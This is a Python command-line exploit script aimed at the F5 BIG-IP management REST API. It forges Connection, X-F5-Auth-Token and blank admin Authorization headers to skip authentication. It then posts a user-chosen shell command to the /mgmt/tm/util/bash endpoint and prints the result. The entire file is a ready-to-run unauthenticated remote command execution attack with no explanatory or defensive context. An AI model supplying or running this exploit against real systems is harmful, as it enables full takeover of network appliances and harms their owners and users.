#!/usr/bin/env python3

import sys
import argparse
import requests
import urllib3


urllib3.disable_warnings()

def main():
    
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-t", "--target", required=True, help="Specify the IP Address/Domain Name of the vulnerable server")
    arg_parser.add_argument("-p", "--port", required=True, help="Specify port number of the vulnerable server")
    arg_parser.add_argument("-c", "--cmd", required=True, help="Specify the command that you want to execute")
    arg_parser.add_argument("--ssl", action="store_true", help="Specify this optional argument if the server uses ssl")
    args = arg_parser.parse_args()
     
    headers = {
                    "Connection": "keep-alive, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host",
                    "X-F5-Auth-Token": "a",
                    "Authorization": "Basic YWRtaW46",
                    "Accept": "*/*"
              }
    data = {
                "command": "run",
                "utilCmdArgs": "-c '{}'".format(args.cmd)
           }
    proxy = {
                "http": "http://127.0.0.1:8080",
                "https": "http://127.0.0.1:8080"
            }
    
    if args.ssl:
        url = "https://{}:{}/mgmt/tm/util/bash".format(args.target, args.port)
        req = requests.post(url,headers=headers, json=data, verify=False)
    else:
        url = "http://{}:{}/mgmt/tm/util/bash".format(args.target, args.port)
        req = requests.post(url,headers=headers, json=data)
    
    try:
        print(req.json()['commandResult'].strip())
    except requests.exceptions.JSONDecodeError:
        print(req.text)

try:
    if __name__ == "__main__":
        main()
except KeyboardInterrupt:
    print("\nReceived KeyboardInterrupt - Exiting...")
